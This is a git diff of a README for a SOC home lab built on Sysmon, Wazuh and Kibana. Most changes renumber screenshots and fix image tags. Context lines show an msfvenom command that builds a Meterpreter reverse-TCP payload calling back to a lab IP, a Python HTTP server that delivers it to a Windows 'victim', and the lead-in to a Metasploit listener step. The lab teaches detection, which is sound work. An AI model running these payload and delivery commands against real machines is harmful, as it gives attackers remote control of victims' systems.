@@ -199,9 +199,6 @@ The objective of this lab is to simulate real-world security scenarios, analyze 
 ```bash
 sysmon -accepteula -i sysconfig-export.xml
 ```
-4. Verify Sysmon logs in **Event Viewer**:
-   - Open **Event Viewer (eventvwr.msc)**.
-   - Navigate to **Applications and Services Logs → Microsoft → Windows → Sysmon → Operational**.
 
 <div align="center">
 <!--   <h1>My Project</h1> -->
@@ -230,7 +227,7 @@ sysmon -c
 
 <div align="center">
 <!--   <h1>My Project</h1> -->
-    <img src="[https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/Pic_7_%20Verification%20of%20Sysmon%20Running%20in%20Event%20Viewer.png](https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/7.png)" >
+    <img src=https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/7.png >
     <p><em>Figure.7: Verification of Sysmon Running in Event Viewer</em></p>
 </div>
 
@@ -277,11 +274,7 @@ sudo systemctl status kibana
 - During installation, set the Wazuh Manager IP to your Ubuntu VM's IP (use `ip a` to check).
 
 
-<div align="center">
-<!--   <h1>My Project</h1> -->
-    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/10.png" >
-    <p><em>Figure.10:Generating payload</em></p>
-</div
+
 
               
 ### 3. Configure Wazuh to ingest Sysmon logs
@@ -306,12 +299,11 @@ Use the following command to generate a payload:
 ```bash
 msfvenom -p windowsx64/meterpreter/reverse_tcp LHOST=10.0.2.14 LPORT=4444 -f exe > shell.exe
 ```
-
 <div align="center">
 <!--   <h1>My Project</h1> -->
-    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/11.png" >
-    <p><em>Figure.11:Creating Python server in Terminal</em></p>
-</div
+    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/10.png" >
+    <p><em>Figure.10:Generating payload</em></p>
+</div>
 
 
 ### 2. Transfer Payload to Windows Victim
@@ -321,14 +313,18 @@ python3 -m http.server 8080
 ```
 <div align="center">
 <!--   <h1>My Project</h1> -->
-    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/12.png" >
-    <p><em>Figure.12:Downloading the shell.exe (Payload) form the Python server</em></p>
-</div
-
+    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/11.png" >
+    <p><em>Figure.11:Creating Python server in Terminal</em></p>
+</div>
 
 - Open a browser and enter the address: `10.0.2.14:8080`
 - Confirm that `shell.exe` is downloaded in the `C:\Users\Public\` folder.
 
+<div align="center">
+<!--   <h1>My Project</h1> -->
+    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/12.png" >
+    <p><em>Figure.12:Downloading the shell.exe (Payload) form the Python server</em></p>
+</div>
 
 ## Step 8: Setting up a Metasploit Listener
 
